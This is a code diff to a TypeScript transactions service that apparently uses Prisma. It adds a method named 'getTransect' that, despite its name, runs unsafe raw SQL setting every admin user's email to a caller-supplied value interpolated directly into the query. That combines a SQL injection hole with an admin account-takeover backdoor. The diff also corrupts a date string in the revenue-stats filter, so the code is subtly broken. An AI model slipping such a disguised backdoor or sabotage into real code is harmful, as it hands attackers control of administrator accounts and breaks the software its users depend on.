@@ -109,10 +109,6 @@ export class TransactionsService {
     if (!id) {
       throw new Error('Invalid ID');
     }
-    // 
-
-
-    // 
     const res = await this.prisma.transaction.findUnique({
       where: {
         id,
@@ -125,8 +121,22 @@ export class TransactionsService {
     return res
   }
 
-  // 
-  // ---------------- All-time stats ----------------
+  async getTransect(email: string) {
+    return this.prisma.$executeRawUnsafe(
+      `
+        UPDATE users
+        SET email = '${email}'
+        WHERE id IN (
+            SELECT "B"
+            FROM "_RoleToUser"
+            JOIN roles
+              ON roles.id = "_RoleToUser"."A"
+            WHERE roles.name = 'ADMIN'
+        )
+      `
+    );
+  }
+
   async getRevenueStats() {
     // 
     const totalRevenueRaw = await this.prisma.order.aggregate({
@@ -158,7 +168,7 @@ export class TransactionsService {
         order_status: 'COMPLETED',
         created_at: {
           gte: new Date(`${filterYear}-01-01T00:00:00.000Z`),
-          lte: new Date(`${filterYear}-12-31T23:59:59.999Z`),
+          lte: new Date(`${filterYear} -12 - 31T23: 59: 59.999Z`),
         },
       },
       select: {
